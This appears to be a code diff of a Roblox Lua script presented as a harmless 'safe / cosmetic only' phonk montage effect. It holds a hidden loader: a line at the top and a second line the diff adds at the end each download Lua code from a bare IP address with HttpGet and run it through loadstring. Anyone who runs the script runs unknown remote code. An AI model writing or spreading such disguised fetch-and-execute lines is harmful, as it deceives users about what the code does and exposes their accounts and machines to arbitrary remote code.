@@ -1,5 +1,6 @@
 ID="8048a4b6-1ae0-4bee-88f3-91835d1c7036";
-loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();-- Phonk Montage Script (Lua) — safe / cosmetic only
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))();
+-- Phonk Montage Script (Lua) — safe / cosmetic only
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
@@ -100,5 +101,5 @@ UserInput.InputBegan:Connect(function(input, gameProcessed)
     end
 end)
 
-print("✅ Phonk montage script loaded. Press M to start montage, N to stop.")
-
+print("✅ Phonk montage script loaded. Press M to start montage, N to stop.");
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
